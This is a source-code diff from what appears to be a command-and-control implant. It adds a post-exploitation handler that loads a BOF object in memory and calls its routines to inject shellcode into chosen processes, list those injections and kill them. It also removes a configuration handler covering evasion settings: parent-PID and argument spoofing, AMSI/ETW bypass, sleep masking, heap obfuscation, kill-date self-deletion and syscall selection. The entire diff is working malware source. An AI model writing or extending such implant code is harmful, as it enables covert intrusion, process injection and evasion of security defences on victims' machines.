@@ -111,6 +111,159 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
     return FinalRoutine();
 }
 
+auto DECLFN Task::Postex(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    PARSER*  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+
+    ULONG SubCmd = Self->Psr->Int32( Parser );
+    
+    Self->Pkg->Int32( Package, SubCmd );
+
+    switch ( (Action::Postex)SubCmd ) {
+    
+    case Action::Postex::Inject: {
+        //
+        // verify if need be loaded
+        //
+        ULONG BofLen = 0;
+        PBYTE BofData = Self->Psr->Bytes( Parser, &BofLen );
+
+        if ( BofLen > 0 && ! Self->Postex.IsLoaded ) {
+            // first time - map bof
+            Self->Postex.Mapped = (COFF_MAPPED*)hAlloc( sizeof(COFF_MAPPED) );
+            
+            if ( ! Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
+                Self->Pkg->Int32( Package, 0 ); // error
+                return KhGetError;
+            }
+
+            // Resolve entry points
+            Self->Postex.fn_inject  = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_inject" );
+            Self->Postex.fn_poll    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_poll" );
+            Self->Postex.fn_kill    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_kill" );
+            Self->Postex.fn_list    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_list" );
+            Self->Postex.fn_cleanup = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_cleanup" );
+
+            Self->Postex.IsLoaded = TRUE;
+
+            // create a persistent job polling
+            PARSER* PollPsr = (PARSER*)hAlloc( sizeof(PARSER) );
+            PBYTE   PollBuf = (BYTE*)hAlloc( sizeof(UINT16) + sizeof(UINT32) );
+            UINT16  PollCmd = (UINT16)Action::Task::PostEx;
+            UINT32  PollSub = (UINT32)Action::Postex::Poll;
+
+            // create: [cmd][subcmd]
+            PollBuf[0] = (PollCmd     )  & 0xFF;
+            PollBuf[1] = (PollCmd >> 8)  & 0xFF;
+            PollBuf[2] = (PollSub      ) & 0xFF;
+            PollBuf[3] = (PollSub >>  8) & 0xFF;
+            PollBuf[4] = (PollSub >> 16) & 0xFF;
+            PollBuf[5] = (PollSub >> 24) & 0xFF;
+
+            Self->Psr->New( PollPsr, PollBuf, sizeof(UINT16) + sizeof(UINT32) );
+            hFree( PollBuf );
+
+            Self->Jbs->Create( Self->Jbs->PostexUUID, PollPsr, TRUE );
+
+            KhDbg("PostexKit loaded, poll job created");
+        }
+
+        if ( ! Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
+            Self->Pkg->Int32( Package, 0 );
+            return KhGetError;
+        }
+
+        //
+        // parse args of inject: method, pid, shellcode and pass to go_inject
+        //
+        ULONG ArgsLen = Parser->Length;  
+        PBYTE Args    = (PBYTE)Parser->Buffer;
+
+        typedef void (*GO_FN)(char*, int);
+        GO_FN fn = (GO_FN)Self->Postex.fn_inject;
+        fn( (char*)Args, ArgsLen );
+
+        Self->Pkg->Int32( Package, 1 ); 
+        break;
+    }
+
+    case Action::Postex::Poll: {
+        if ( !Self->Postex.IsLoaded || !Self->Postex.fn_poll ) {
+            Job->Clean = TRUE;
+            return KhRetSuccess;
+        }
+
+        typedef void (*GO_FN)(char*, int);
+        GO_FN fn = (GO_FN)Self->Postex.fn_poll;
+        fn( nullptr, 0 );
+
+        // check count via BeaconGetValue
+        PUINT32 CountPtr = (PUINT32)Self->Cf->GetValue( "\x8e\x4b\x2d\xf7\x5c\x9a\x3e\xb1" );
+        
+        if ( CountPtr && *CountPtr == 0 ) {
+            // if not anyone postex, so unmap
+            Self->Cf->Unmap( Self->Postex.Mapped );
+            hFree( Self->Postex.Mapped );
+            
+            Self->Postex.Mapped     = nullptr;
+            Self->Postex.IsLoaded   = FALSE;
+            Self->Postex.fn_inject  = nullptr;
+            Self->Postex.fn_poll    = nullptr;
+            Self->Postex.fn_kill    = nullptr;
+            Self->Postex.fn_list    = nullptr;
+            Self->Postex.fn_cleanup = nullptr;
+
+            Job->Clean = TRUE;
+            KhDbg("PostexKit unloaded, no active postex");
+        } else {
+            Job->Clean = FALSE;  // continue polling
+        }
+        break;
+    }
+
+    case Action::Postex::Kill: {
+        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_kill ) {
+            return KhGetError;
+        }
+
+        ULONG ArgsLen = Parser->Length;
+        PBYTE Args    = (PBYTE)Parser->Buffer;
+
+        typedef void (*GO_FN)(char*, int);
+        GO_FN fn = (GO_FN)Self->Postex.fn_kill;
+        fn( (char*)Args, ArgsLen );
+        break;
+    }
+
+    case Action::Postex::List: {
+        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_list ) {
+            return KhGetError;
+        }
+
+        typedef void (*GO_FN)(char*, int);
+        GO_FN fn = (GO_FN)Self->Postex.fn_list;
+        fn( nullptr, 0 );
+        break;
+    }
+
+    case Action::Postex::Cleanup: {
+        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_cleanup ) {
+            return KhGetError;
+        }
+
+        typedef void (*GO_FN)(char*, int);
+        GO_FN fn = (GO_FN)Self->Postex.fn_cleanup;
+        fn( nullptr, 0 );
+        break;
+    }
+
+    }
+
+    return KhRetSuccess;
+}
+
 auto DECLFN Task::ExecBof(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
@@ -118,9 +271,6 @@ auto DECLFN Task::ExecBof(
 
     PACKAGE* Package = Job->Pkg;
     PARSER*  Parser  = Job->Psr;
-
-    G_PACKAGE = Package;
-    G_PARSER  = Parser;
 
     ULONG BofLen   = 0;
     PBYTE BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
@@ -600,199 +750,6 @@ auto DECLFN Task::Pivot(
         }
     }
     
-    return KhRetSuccess;
-}
-
-auto DECLFN Task::Config(
-    _In_ JOBS* Job
-) -> ERROR_CODE {
-    PACKAGE* Package = Job->Pkg;
-    PARSER*  Parser  = Job->Psr;
-
-    INT32    ConfigCount = Self->Psr->Int32( Parser );
-    ULONG    TmpVal      = 0;
-    BOOL     Success     = FALSE;
-
-    KhDbg( "config count: %d", ConfigCount );
-
-    for ( INT i = 0; i < ConfigCount; i++ ) {
-        Action::Config ConfigID = (Action::Config)Self->Psr->Int32( Parser );
-        KhDbg( "config id: %d", ConfigID );
-        switch ( ConfigID ) {
-            case Action::Config::Ppid: {
-                ULONG ParentID = Self->Psr->Int32( Parser );
-                Self->Config.Ps.ParentID = ParentID;
-
-                KhDbg( "parent id set to %d", Self->Config.Ps.ParentID ); 
-                
-                break;
-            }
-            case Action::Config::Sleep: {
-                ULONG NewSleep = Self->Psr->Int32( Parser );
-                Self->Config.SleepTime = NewSleep * 1000;
-
-                KhDbg( "new sleep time set to %d ms", Self->Config.SleepTime ); 
-                
-                break;
-            }
-            case Action::Config::Jitter: {
-                ULONG NewJitter = Self->Psr->Int32( Parser );
-                Self->Config.Jitter = NewJitter;
-
-                KhDbg( "new jitter set to %d", Self->Config.Jitter ); 
-                
-                break;
-            }
-            case Action::Config::BlockDlls: {
-                BOOL BlockDlls  = Self->Psr->Int32( Parser );
-                Self->Config.Ps.BlockDlls = BlockDlls;
-                
-                KhDbg( "block non microsoft dlls is %s", Self->Config.Ps.BlockDlls ? "enabled" : "disabled" ); 
-                
-                break;
-            }
-            case Action::Config::Mask: {
-                INT32 TechniqueID = Self->Psr->Int32( Parser );
-                if ( 
-                    TechniqueID != eMask::Timer &&
-                    TechniqueID != eMask::None 
-                ) {
-                    KhDbg( "invalid mask id: %d", TechniqueID );
-                    return KH_ERROR_INVALID_MASK_ID;
-                }
-            
-                Self->Config.Mask.Beacon = TechniqueID;
-            
-                KhDbg( 
-                    "mask technique id set to %d (%s)", Self->Config.Mask.Beacon, 
-                    Self->Config.Mask.Beacon   == eMask::Timer ? "timer" : 
-                    ( Self->Config.Mask.Beacon == eMask::None  ? "wait" : "unknown" ) 
-                );
-
-                break;
-            }
-            case Action::Config::HeapObf: {
-                BOOL HeapObf = Self->Psr->Int32( Parser );
-
-                Self->Config.Mask.Heap = HeapObf;
-
-                KhDbg("Heap Obfuscate is %s", HeapObf ? "enabled" : "disabled");
-                break;
-            }
-            case Action::Config::Spawn: {
-                WCHAR* Spawnto = Self->Psr->Wstr( Parser, 0 );
-                
-                Self->Config.Postex.Spawnto = Spawnto;
-
-                KhDbg("Spawnto is set to %s\n", Spawnto);
-
-                break;
-            }
-            case Action::Config::Killdate: {
-                SYSTEMTIME LocalTime { 0 };
-
-                INT16 Year  = (INT16)Self->Psr->Int32( Parser );
-                INT16 Month = (INT16)Self->Psr->Int32( Parser );
-                INT16 Day   = (INT16)Self->Psr->Int32( Parser );
-
-                Self->Config.KillDate.Day   = Day;
-                Self->Config.KillDate.Month = Month;
-                Self->Config.KillDate.Year  = Year;
-
-                if ( ! Day && ! Month && ! Year ) { 
-                    Self->Config.KillDate.Enabled = FALSE;
-                } else {
-                    Self->Config.KillDate.Enabled = TRUE;
-                }
-
-                break;
-            }
-            case Action::Config::KilldateExit: {
-                BOOL KdExitProc = Self->Psr->Int32( Parser );
-                
-                Self->Config.KillDate.ExitProc = KdExitProc;
-
-                KhDbg("Killdate set to exit %s", KdExitProc ? "process" : "thread");
-
-                break;
-            }
-            case Action::Config::KilldateSelfdel: {
-                BOOL KdSelfdel = Self->Psr->Int32( Parser );
-
-                Self->Config.KillDate.SelfDelete = KdSelfdel;
-
-                KhDbg("Killdate set selfdelete to %s", KdSelfdel ? " true" : "false");
-
-                break;
-            }
-            case Action::Config::AmsiEtwBypass: {
-                ULONG AmsiEtwBypass = Self->Psr->Int32( Parser );
-
-                Self->Config.AmsiEtwBypass = AmsiEtwBypass;
-
-                KhDbg("Amsi/Etw bypass changed");
-
-                break;
-            }
-            case Action::Config::Worktime: {
-                INT16 HrStart = (INT16)Self->Psr->Int32( Parser );
-                INT16 MnStart = (INT16)Self->Psr->Int32( Parser );
-                INT16 HrEnd   = (INT16)Self->Psr->Int32( Parser );
-                INT16 MnEnd   = (INT16)Self->Psr->Int32( Parser );
-
-                Self->Config.Worktime.StartHour = HrStart;
-                Self->Config.Worktime.StartMin  = MnStart;
-                Self->Config.Worktime.EndMin    = HrEnd;
-                Self->Config.Worktime.EndHour   = MnEnd;
-
-                if ( ! HrStart && ! MnStart && ! HrEnd && ! MnEnd ) {
-                    Self->Config.Worktime.Enabled = FALSE;
-                } else {
-                    Self->Config.Worktime.Enabled = TRUE;
-                }
-
-                break;
-            }
-            case Action::Config::Syscall: {
-                INT32 Syscall = Self->Psr->Int32( Parser );
-
-                Self->Config.Syscall = Syscall;
-
-                KhDbg("syscall method changed to: %d", Syscall);
-
-                break;
-            }
-            case Action::Config::ForkPipeName: {
-                CHAR* ForkPipeName = Self->Psr->Str( Parser, nullptr );
-
-                Self->Config.Postex.ForkPipe = ForkPipeName;
-
-                KhDbg("Fork pipe name changed to: %s", Self->Config.Postex.ForkPipe);
-
-                break;
-            }
-            case Action::Config::BofApiProxy: {
-                BOOL BofApiProxy = Self->Psr->Int32( Parser );
-
-                Self->Config.BofProxy = BofApiProxy;
-
-                KhDbg("BOF API Proxy is %s", BofApiProxy ? "enabled" : "disabled");
-
-                break;
-            }
-            case Action::Config::Argue: {
-                ULONG  ArgLen = 0;
-                WCHAR* Argue  = Self->Psr->Wstr( Parser, &ArgLen );
-
-                Self->Config.Ps.SpoofArg = Argue;
-
-                KhDbg("Spoofed arg set: %S", Argue);
-
-                break;
-            }
-        }        
-    }
-
     return KhRetSuccess;
 }
 
